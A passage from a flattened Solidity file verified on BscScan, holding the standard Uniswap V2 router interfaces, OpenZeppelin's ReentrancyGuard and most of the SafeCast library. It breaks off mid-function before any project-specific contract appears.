/**
 *Submitted for verification at BscScan.com on 2025-05-17
*/

/**
 *Submitted for verification at BscScan.com on 2025-05-17
*/

/**
 *Submitted for verification at BscScan.com on 2025-04-30
*/

// SPDX-License-Identifier: MIT
// File: https://github.com/Uniswap/v2-periphery/blob/master/contracts/interfaces/IUniswapV2Router01.sol

pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

// File: https://github.com/Uniswap/v2-periphery/blob/master/contracts/interfaces/IUniswapV2Router02.sol

pragma solidity >=0.6.2;


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// File: @openzeppelin/contracts/security/ReentrancyGuard.sol


// OpenZeppelin Contracts (last updated v4.9.0) (security/ReentrancyGuard.sol)

pragma solidity ^0.8.0;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be _NOT_ENTERED
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
     * `nonReentrant` function in the call stack.
     */
    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == _ENTERED;
    }
}

// File: @openzeppelin/contracts/utils/math/SafeCast.sol


// OpenZeppelin Contracts (last updated v5.1.0) (utils/math/SafeCast.sol)
// This file was procedurally generated from scripts/generate/templates/SafeCast.js.

pragma solidity ^0.8.20;

/**
 * @dev Wrappers over Solidity's uintXX/intXX/bool casting operators with added overflow
 * checks.
 *
 * Downcasting from uint256/int256 in Solidity does not revert on overflow. This can
 * easily result in undesired exploitation or bugs, since developers usually
 * assume that overflows raise errors. `SafeCast` restores this intuition by
 * reverting the transaction when such an operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeCast {
    /**
     * @dev Value doesn't fit in an uint of `bits` size.
     */
    error SafeCastOverflowedUintDowncast(uint8 bits, uint256 value);

    /**
     * @dev An int value doesn't fit in an uint of `bits` size.
     */
    error SafeCastOverflowedIntToUint(int256 value);

    /**
     * @dev Value doesn't fit in an int of `bits` size.
     */
    error SafeCastOverflowedIntDowncast(uint8 bits, int256 value);

    /**
     * @dev An uint value doesn't fit in an int of `bits` size.
     */
    error SafeCastOverflowedUintToInt(uint256 value);

    /**
     * @dev Returns the downcasted uint248 from uint256, reverting on
     * overflow (when the input is greater than largest uint248).
     *
     * Counterpart to Solidity's `uint248` operator.
     *
     * Requirements:
     *
     * - input must fit into 248 bits
     */
    function toUint248(uint256 value) internal pure returns (uint248) {
        if (value > type(uint248).max) {
            revert SafeCastOverflowedUintDowncast(248, value);
        }
        return uint248(value);
    }

    /**
     * @dev Returns the downcasted uint240 from uint256, reverting on
     * overflow (when the input is greater than largest uint240).
     *
     * Counterpart to Solidity's `uint240` operator.
     *
     * Requirements:
     *
     * - input must fit into 240 bits
     */
    function toUint240(uint256 value) internal pure returns (uint240) {
        if (value > type(uint240).max) {
            revert SafeCastOverflowedUintDowncast(240, value);
        }
        return uint240(value);
    }

    /**
     * @dev Returns the downcasted uint232 from uint256, reverting on
     * overflow (when the input is greater than largest uint232).
     *
     * Counterpart to Solidity's `uint232` operator.
     *
     * Requirements:
     *
     * - input must fit into 232 bits
     */
    function toUint232(uint256 value) internal pure returns (uint232) {
        if (value > type(uint232).max) {
            revert SafeCastOverflowedUintDowncast(232, value);
        }
        return uint232(value);
    }

    /**
     * @dev Returns the downcasted uint224 from uint256, reverting on
     * overflow (when the input is greater than largest uint224).
     *
     * Counterpart to Solidity's `uint224` operator.
     *
     * Requirements:
     *
     * - input must fit into 224 bits
     */
    function toUint224(uint256 value) internal pure returns (uint224) {
        if (value > type(uint224).max) {
            revert SafeCastOverflowedUintDowncast(224, value);
        }
        return uint224(value);
    }

    /**
     * @dev Returns the downcasted uint216 from uint256, reverting on
     * overflow (when the input is greater than largest uint216).
     *
     * Counterpart to Solidity's `uint216` operator.
     *
     * Requirements:
     *
     * - input must fit into 216 bits
     */
    function toUint216(uint256 value) internal pure returns (uint216) {
        if (value > type(uint216).max) {
            revert SafeCastOverflowedUintDowncast(216, value);
        }
        return uint216(value);
    }

    /**
     * @dev Returns the downcasted uint208 from uint256, reverting on
     * overflow (when the input is greater than largest uint208).
     *
     * Counterpart to Solidity's `uint208` operator.
     *
     * Requirements:
     *
     * - input must fit into 208 bits
     */
    function toUint208(uint256 value) internal pure returns (uint208) {
        if (value > type(uint208).max) {
            revert SafeCastOverflowedUintDowncast(208, value);
        }
        return uint208(value);
    }

    /**
     * @dev Returns the downcasted uint200 from uint256, reverting on
     * overflow (when the input is greater than largest uint200).
     *
     * Counterpart to Solidity's `uint200` operator.
     *
     * Requirements:
     *
     * - input must fit into 200 bits
     */
    function toUint200(uint256 value) internal pure returns (uint200) {
        if (value > type(uint200).max) {
            revert SafeCastOverflowedUintDowncast(200, value);
        }
        return uint200(value);
    }

    /**
     * @dev Returns the downcasted uint192 from uint256, reverting on
     * overflow (when the input is greater than largest uint192).
     *
     * Counterpart to Solidity's `uint192` operator.
     *
     * Requirements:
     *
     * - input must fit into 192 bits
     */
    function toUint192(uint256 value) internal pure returns (uint192) {
        if (value > type(uint192).max) {
            revert SafeCastOverflowedUintDowncast(192, value);
        }
        return uint192(value);
    }

    /**
     * @dev Returns the downcasted uint184 from uint256, reverting on
     * overflow (when the input is greater than largest uint184).
     *
     * Counterpart to Solidity's `uint184` operator.
     *
     * Requirements:
     *
     * - input must fit into 184 bits
     */
    function toUint184(uint256 value) internal pure returns (uint184) {
        if (value > type(uint184).max) {
            revert SafeCastOverflowedUintDowncast(184, value);
        }
        return uint184(value);
    }

    /**
     * @dev Returns the downcasted uint176 from uint256, reverting on
     * overflow (when the input is greater than largest uint176).
     *
     * Counterpart to Solidity's `uint176` operator.
     *
     * Requirements:
     *
     * - input must fit into 176 bits
     */
    function toUint176(uint256 value) internal pure returns (uint176) {
        if (value > type(uint176).max) {
            revert SafeCastOverflowedUintDowncast(176, value);
        }
        return uint176(value);
    }

    /**
     * @dev Returns the downcasted uint168 from uint256, reverting on
     * overflow (when the input is greater than largest uint168).
     *
     * Counterpart to Solidity's `uint168` operator.
     *
     * Requirements:
     *
     * - input must fit into 168 bits
     */
    function toUint168(uint256 value) internal pure returns (uint168) {
        if (value > type(uint168).max) {
            revert SafeCastOverflowedUintDowncast(168, value);
        }
        return uint168(value);
    }

    /**
     * @dev Returns the downcasted uint160 from uint256, reverting on
     * overflow (when the input is greater than largest uint160).
     *
     * Counterpart to Solidity's `uint160` operator.
     *
     * Requirements:
     *
     * - input must fit into 160 bits
     */
    function toUint160(uint256 value) internal pure returns (uint160) {
        if (value > type(uint160).max) {
            revert SafeCastOverflowedUintDowncast(160, value);
        }
        return uint160(value);
    }

    /**
     * @dev Returns the downcasted uint152 from uint256, reverting on
     * overflow (when the input is greater than largest uint152).
     *
     * Counterpart to Solidity's `uint152` operator.
     *
     * Requirements:
     *
     * - input must fit into 152 bits
     */
    function toUint152(uint256 value) internal pure returns (uint152) {
        if (value > type(uint152).max) {
            revert SafeCastOverflowedUintDowncast(152, value);
        }
        return uint152(value);
    }

    /**
     * @dev Returns the downcasted uint144 from uint256, reverting on
     * overflow (when the input is greater than largest uint144).
     *
     * Counterpart to Solidity's `uint144` operator.
     *
     * Requirements:
     *
     * - input must fit into 144 bits
     */
    function toUint144(uint256 value) internal pure returns (uint144) {
        if (value > type(uint144).max) {
            revert SafeCastOverflowedUintDowncast(144, value);
        }
        return uint144(value);
    }

    /**
     * @dev Returns the downcasted uint136 from uint256, reverting on
     * overflow (when the input is greater than largest uint136).
     *
     * Counterpart to Solidity's `uint136` operator.
     *
     * Requirements:
     *
     * - input must fit into 136 bits
     */
    function toUint136(uint256 value) internal pure returns (uint136) {
        if (value > type(uint136).max) {
            revert SafeCastOverflowedUintDowncast(136, value);
        }
        return uint136(value);
    }

    /**
     * @dev Returns the downcasted uint128 from uint256, reverting on
     * overflow (when the input is greater than largest uint128).
     *
     * Counterpart to Solidity's `uint128` operator.
     *
     * Requirements:
     *
     * - input must fit into 128 bits
     */
    function toUint128(uint256 value) internal pure returns (uint128) {
        if (value > type(uint128).max) {
            revert SafeCastOverflowedUintDowncast(128, value);
        }
        return uint128(value);
    }

    /**
     * @dev Returns the downcasted uint120 from uint256, reverting on
     * overflow (when the input is greater than largest uint120).
     *
     * Counterpart to Solidity's `uint120` operator.
     *
     * Requirements:
     *
     * - input must fit into 120 bits
     */
    function toUint120(uint256 value) internal pure returns (uint120) {
        if (value > type(uint120).max) {
            revert SafeCastOverflowedUintDowncast(120, value);
        }
        return uint120(value);
    }

    /**
     * @dev Returns the downcasted uint112 from uint256, reverting on
     * overflow (when the input is greater than largest uint112).
     *
     * Counterpart to Solidity's `uint112` operator.
     *
     * Requirements:
     *
     * - input must fit into 112 bits
     */
    function toUint112(uint256 value) internal pure returns (uint112) {
        if (value > type(uint112).max) {
            revert SafeCastOverflowedUintDowncast(112, value);
        }
        return uint112(value);
    }

    /**
     * @dev Returns the downcasted uint104 from uint256, reverting on
     * overflow (when the input is greater than largest uint104).
     *
     * Counterpart to Solidity's `uint104` operator.
     *
     * Requirements:
     *
     * - input must fit into 104 bits
     */
    function toUint104(uint256 value) internal pure returns (uint104) {
        if (value > type(uint104).max) {
            revert SafeCastOverflowedUintDowncast(104, value);
        }
        return uint104(value);
    }

    /**
     * @dev Returns the downcasted uint96 from uint256, reverting on
     * overflow (when the input is greater than largest uint96).
     *
     * Counterpart to Solidity's `uint96` operator.
     *
     * Requirements:
     *
     * - input must fit into 96 bits
     */
    function toUint96(uint256 value) internal pure returns (uint96) {
        if (value > type(uint96).max) {
            revert SafeCastOverflowedUintDowncast(96, value);
        }
        return uint96(value);
    }

    /**
     * @dev Returns the downcasted uint88 from uint256, reverting on
     * overflow (when the input is greater than largest uint88).
     *
     * Counterpart to Solidity's `uint88` operator.
     *
     * Requirements:
     *
     * - input must fit into 88 bits
     */
    function toUint88(uint256 value) internal pure returns (uint88) {
        if (value > type(uint88).max) {
            revert SafeCastOverflowedUintDowncast(88, value);
        }
        return uint88(value);
    }

    /**
     * @dev Returns the downcasted uint80 from uint256, reverting on
     * overflow (when the input is greater than largest uint80).
     *
     * Counterpart to Solidity's `uint80` operator.
     *
     * Requirements:
     *
     * - input must fit into 80 bits
     */
    function toUint80(uint256 value) internal pure returns (uint80) {
        if (value > type(uint80).max) {
            revert SafeCastOverflowedUintDowncast(80, value);
        }
        return uint80(value);
    }

    /**
     * @dev Returns the downcasted uint72 from uint256, reverting on
     * overflow (when the input is greater than largest uint72).
     *
     * Counterpart to Solidity's `uint72` operator.
     *
     * Requirements:
     *
     * - input must fit into 72 bits
     */
    function toUint72(uint256 value) internal pure returns (uint72) {
        if (value > type(uint72).max) {
            revert SafeCastOverflowedUintDowncast(72, value);
        }
        return uint72(value);
    }

    /**
     * @dev Returns the downcasted uint64 from uint256, reverting on
     * overflow (when the input is greater than largest uint64).
     *
     * Counterpart to Solidity's `uint64` operator.
     *
     * Requirements:
     *
     * - input must fit into 64 bits
     */
    function toUint64(uint256 value) internal pure returns (uint64) {
        if (value > type(uint64).max) {
            revert SafeCastOverflowedUintDowncast(64, value);
        }
        return uint64(value);
    }

    /**
     * @dev Returns the downcasted uint56 from uint256, reverting on
     * overflow (when the input is greater than largest uint56).
     *
     * Counterpart to Solidity's `uint56` operator.
     *
     * Requirements:
     *
     * - input must fit into 56 bits
     */
    function toUint56(uint256 value) internal pure returns (uint56) {
        if (value > type(uint56).max) {
            revert SafeCastOverflowedUintDowncast(56, value);
        }
        return uint56(value);
    }

    /**
     * @dev Returns the downcasted uint48 from uint256, reverting on
     * overflow (when the input is greater than largest uint48).
     *
     * Counterpart to Solidity's `uint48` operator.
     *
     * Requirements:
     *
     * - input must fit into 48 bits
     */
    function toUint48(uint256 value) internal pure returns (uint48) {
        if (value > type(uint48).max) {
            revert SafeCastOverflowedUintDowncast(48, value);
        }
        return uint48(value);
    }

    /**
     * @dev Returns the downcasted uint40 from uint256, reverting on
     * overflow (when the input is greater than largest uint40).
     *
     * Counterpart to Solidity's `uint40` operator.
     *
     * Requirements:
     *
     * - input must fit into 40 bits
     */
    function toUint40(uint256 value) internal pure returns (uint40) {
        if (value > type(uint40).max) {
            revert SafeCastOverflowedUintDowncast(40, value);
        }
        return uint40(value);
    }

    /**
     * @dev Returns the downcasted uint32 from uint256, reverting on
     * overflow (when the input is greater than largest uint32).
     *
     * Counterpart to Solidity's `uint32` operator.
     *
     * Requirements:
     *
     * - input must fit into 32 bits
     */
    function toUint32(uint256 value) internal pure returns (uint32) {
        if (value > type(uint32).max) {
            revert SafeCastOverflowedUintDowncast(32, value);
        }
        return uint32(value);
    }

    /**
     * @dev Returns the downcasted uint24 from uint256, reverting on
     * overflow (when the input is greater than largest uint24).
     *
     * Counterpart to Solidity's `uint24` operator.
     *
     * Requirements:
     *
     * - input must fit into 24 bits
     */
    function toUint24(uint256 value) internal pure returns (uint24) {
        if (value > type(uint24).max) {
            revert SafeCastOverflowedUintDowncast(24, value);
        }
        return uint24(value);
    }

    /**
     * @dev Returns the downcasted uint16 from uint256, reverting on
     * overflow (when the input is greater than largest uint16).
     *
     * Counterpart to Solidity's `uint16` operator.
     *
     * Requirements:
     *
     * - input must fit into 16 bits
     */
    function toUint16(uint256 value) internal pure returns (uint16) {
        if (value > type(uint16).max) {
            revert SafeCastOverflowedUintDowncast(16, value);
        }
        return uint16(value);
    }

    /**
     * @dev Returns the downcasted uint8 from uint256, reverting on
     * overflow (when the input is greater than largest uint8).
     *
     * Counterpart to Solidity's `uint8` operator.
     *
     * Requirements:
     *
     * - input must fit into 8 bits
     */
    function toUint8(uint256 value) internal pure returns (uint8) {
        if (value > type(uint8).max) {
            revert SafeCastOverflowedUintDowncast(8, value);
        }
        return uint8(value);
    }

    /**
     * @dev Converts a signed int256 into an unsigned uint256.
     *
     * Requirements:
     *
     * - input must be greater than or equal to 0.
     */
    function toUint256(int256 value) internal pure returns (uint256) {
        if (value < 0) {
            revert SafeCastOverflowedIntToUint(value);
        }
        return uint256(value);
    }

    /**
     * @dev Returns the downcasted int248 from int256, reverting on
     * overflow (when the input is less than smallest int248 or
     * greater than largest int248).
     *
     * Counterpart to Solidity's `int248` operator.
     *
     * Requirements:
     *
     * - input must fit into 248 bits
     */
    function toInt248(int256 value) internal pure returns (int248 downcasted) {
        downcasted = int248(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(248, value);
        }
    }

    /**
     * @dev Returns the downcasted int240 from int256, reverting on
     * overflow (when the input is less than smallest int240 or
     * greater than largest int240).
     *
     * Counterpart to Solidity's `int240` operator.
     *
     * Requirements:
     *
     * - input must fit into 240 bits
     */
    function toInt240(int256 value) internal pure returns (int240 downcasted) {
        downcasted = int240(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(240, value);
        }
    }

    /**
     * @dev Returns the downcasted int232 from int256, reverting on
     * overflow (when the input is less than smallest int232 or
     * greater than largest int232).
     *
     * Counterpart to Solidity's `int232` operator.
     *
     * Requirements:
     *
     * - input must fit into 232 bits
     */
    function toInt232(int256 value) internal pure returns (int232 downcasted) {
        downcasted = int232(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(232, value);
        }
    }

    /**
     * @dev Returns the downcasted int224 from int256, reverting on
     * overflow (when the input is less than smallest int224 or
     * greater than largest int224).
     *
     * Counterpart to Solidity's `int224` operator.
     *
     * Requirements:
     *
     * - input must fit into 224 bits
     */
    function toInt224(int256 value) internal pure returns (int224 downcasted) {
        downcasted = int224(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(224, value);
        }
    }

    /**
     * @dev Returns the downcasted int216 from int256, reverting on
     * overflow (when the input is less than smallest int216 or
     * greater than largest int216).
     *
     * Counterpart to Solidity's `int216` operator.
     *
     * Requirements:
     *
     * - input must fit into 216 bits
     */
    function toInt216(int256 value) internal pure returns (int216 downcasted) {
        downcasted = int216(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(216, value);
        }
    }

    /**
     * @dev Returns the downcasted int208 from int256, reverting on
     * overflow (when the input is less than smallest int208 or
     * greater than largest int208).
     *
     * Counterpart to Solidity's `int208` operator.
     *
     * Requirements:
     *
     * - input must fit into 208 bits
     */
    function toInt208(int256 value) internal pure returns (int208 downcasted) {
        downcasted = int208(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(208, value);
        }
    }

    /**
     * @dev Returns the downcasted int200 from int256, reverting on
     * overflow (when the input is less than smallest int200 or
     * greater than largest int200).
     *
     * Counterpart to Solidity's `int200` operator.
     *
     * Requirements:
     *
     * - input must fit into 200 bits
     */
    function toInt200(int256 value) internal pure returns (int200 downcasted) {
        downcasted = int200(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(200, value);
        }
    }

    /**
     * @dev Returns the downcasted int192 from int256, reverting on
     * overflow (when the input is less than smallest int192 or
     * greater than largest int192).
     *
     * Counterpart to Solidity's `int192` operator.
     *
     * Requirements:
     *
     * - input must fit into 192 bits
     */
    function toInt192(int256 value) internal pure returns (int192 downcasted) {
        downcasted = int192(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(192, value);
        }
    }

    /**
     * @dev Returns the downcasted int184 from int256, reverting on
     * overflow (when the input is less than smallest int184 or
     * greater than largest int184).
     *
     * Counterpart to Solidity's `int184` operator.
     *
     * Requirements:
     *
     * - input must fit into 184 bits
     */
    function toInt184(int256 value) internal pure returns (int184 downcasted) {
        downcasted = int184(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(184, value);
        }
    }

    /**
     * @dev Returns the downcasted int176 from int256, reverting on
     * overflow (when the input is less than smallest int176 or
     * greater than largest int176).
     *
     * Counterpart to Solidity's `int176` operator.
     *
     * Requirements:
     *
     * - input must fit into 176 bits
     */
    function toInt176(int256 value) internal pure returns (int176 downcasted) {
        downcasted = int176(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(176, value);
        }
    }

    /**
     * @dev Returns the downcasted int168 from int256, reverting on
     * overflow (when the input is less than smallest int168 or
     * greater than largest int168).
     *
     * Counterpart to Solidity's `int168` operator.
     *
     * Requirements:
     *
     * - input must fit into 168 bits
     */
    function toInt168(int256 value) internal pure returns (int168 downcasted) {
        downcasted = int168(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(168, value);
        }
    }

    /**
     * @dev Returns the downcasted int160 from int256, reverting on
     * overflow (when the input is less than smallest int160 or
     * greater than largest int160).
     *
     * Counterpart to Solidity's `int160` operator.
     *
     * Requirements:
     *
     * - input must fit into 160 bits
     */
    function toInt160(int256 value) internal pure returns (int160 downcasted) {
        downcasted = int160(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(160, value);
        }
    }

    /**
     * @dev Returns the downcasted int152 from int256, reverting on
     * overflow (when the input is less than smallest int152 or
     * greater than largest int152).
     *
     * Counterpart to Solidity's `int152` operator.
     *
     * Requirements:
     *
     * - input must fit into 152 bits
     */
    function toInt152(int256 value) internal pure returns (int152 downcasted) {
        downcasted = int152(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(152, value);
        }
    }

    /**
     * @dev Returns the downcasted int144 from int256, reverting on
     * overflow (when the input is less than smallest int144 or
     * greater than largest int144).
     *
     * Counterpart to Solidity's `int144` operator.
     *
     * Requirements:
     *
     * - input must fit into 144 bits
     */
    function toInt144(int256 value) internal pure returns (int144 downcasted) {
        downcasted = int144(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(144, value);
        }
    }

    /**
     * @dev Returns the downcasted int136 from int256, reverting on
     * overflow (when the input is less than smallest int136 or
     * greater than largest int136).
     *
     * Counterpart to Solidity's `int136` operator.
     *
     * Requirements:
     *
     * - input must fit into 136 bits
     */
    function toInt136(int256 value) internal pure returns (int136 downcasted) {
        downcasted = int136(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(136, value);
        }
    }

    /**
     * @dev Returns the downcasted int128 from int256, reverting on
     * overflow (when the input is less than smallest int128 or
     * greater than largest int128).
     *
     * Counterpart to Solidity's `int128` operator.
     *
     * Requirements:
     *
     * - input must fit into 128 bits
     */
    function toInt128(int256 value) internal pure returns (int128 downcasted) {
        downcasted = int128(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(128, value);
        }
    }

    /**
     * @dev Returns the downcasted int120 from int256, reverting on
     * overflow (when the input is less than smallest int120 or
     * greater than largest int120).
     *
     * Counterpart to Solidity's `int120` operator.
     *
     * Requirements:
     *
     * - input must fit into 120 bits
     */
    function toInt120(int256 value) internal pure returns (int120 downcasted) {
        downcasted = int120(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(120, value);
        }
    }

    /**
     * @dev Returns the downcasted int112 from int256, reverting on
     * overflow (when the input is less than smallest int112 or
     * greater than largest int112).
     *
     * Counterpart to Solidity's `int112` operator.
     *
     * Requirements:
     *
     * - input must fit into 112 bits
     */
    function toInt112(int256 value) internal pure returns (int112 downcasted) {
        downcasted = int112(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(112, value);
        }
    }

    /**
     * @dev Returns the downcasted int104 from int256, reverting on
     * overflow (when the input is less than smallest int104 or
     * greater than largest int104).
     *
     * Counterpart to Solidity's `int104` operator.
     *
     * Requirements:
     *
     * - input must fit into 104 bits
     */
    function toInt104(int256 value) internal pure returns (int104 downcasted) {
        downcasted = int104(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(104, value);
        }
    }

    /**
     * @dev Returns the downcasted int96 from int256, reverting on
     * overflow (when the input is less than smallest int96 or
     * greater than largest int96).
     *
     * Counterpart to Solidity's `int96` operator.
     *
     * Requirements:
     *
     * - input must fit into 96 bits
     */
    function toInt96(int256 value) internal pure returns (int96 downcasted) {
        downcasted = int96(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(96, value);
        }
    }

    /**
     * @dev Returns the downcasted int88 from int256, reverting on
     * overflow (when the input is less than smallest int88 or
     * greater than largest int88).
     *
     * Counterpart to Solidity's `int88` operator.
     *
     * Requirements:
     *
     * - input must fit into 88 bits
     */
    function toInt88(int256 value) internal pure returns (int88 downcasted) {
        downcasted = int88(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(88, value);
        }
    }

    /**
     * @dev Returns the downcasted int80 from int256, reverting on
     * overflow (when the input is less than smallest int80 or
     * greater than largest int80).
     *
     * Counterpart to Solidity's `int80` operator.
     *
     * Requirements:
     *
     * - input must fit into 80 bits
     */
    function toInt80(int256 value) internal pure returns (int80 downcasted) {
        downcasted = int80(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(80, value);
        }
    }

    /**
     * @dev Returns the downcasted int72 from int256, reverting on
     * overflow (when the input is less than smallest int72 or
     * greater than largest int72).
     *
     * Counterpart to Solidity's `int72` operator.
     *
     * Requirements:
     *
     * - input must fit into 72 bits
     */
    function toInt72(int256 value) internal pure returns (int72 downcasted) {
        downcasted = int72(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(72, value);
        }
    }

    /**
     * @dev Returns the downcasted int64 from int256, reverting on
     * overflow (when the input is less than smallest int64 or
     * greater than largest int64).
     *
     * Counterpart to Solidity's `int64` operator.
     *
     * Requirements:
     *
     * - input must fit into 64 bits
     */
    function toInt64(int256 value) internal pure returns (int64 downcasted) {
        downcasted = int64(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(64, value);
        }
    }

    /**
     * @dev Returns the downcasted int56 from int256, reverting on
     * overflow (when the input is less than smallest int56 or
     * greater than largest int56).
     *
     * Counterpart to Solidity's `int56` operator.
     *
     * Requirements:
     *
     * - input must fit into 56 bits
     */
    function toInt56(int256 value) internal pure returns (int56 downcasted) {
        downcasted = int56(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(56, value);
        }
    }

    /**
     * @dev Returns the downcasted int48 from int256, reverting on
     * overflow (when the input is less than smallest int48 or
     * greater than largest int48).
     *
     * Counterpart to Solidity's `int48` operator.
     *
     * Requirements:
     *
     * - input must fit into 48 bits
     */
    function toInt48(int256 value) internal pure returns (int48 downcasted) {
        downcasted = int48(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(48, value);
        }
    }

    /**
     * @dev Returns the downcasted int40 from int256, reverting on
     * overflow (when the input is less than smallest int40 or
     * greater than largest int40).
     *
     * Counterpart to Solidity's `int40` operator.
     *
     * Requirements:
     *
     * - input must fit into 40 bits
     */
    function toInt40(int256 value) internal pure returns (int40 downcasted) {
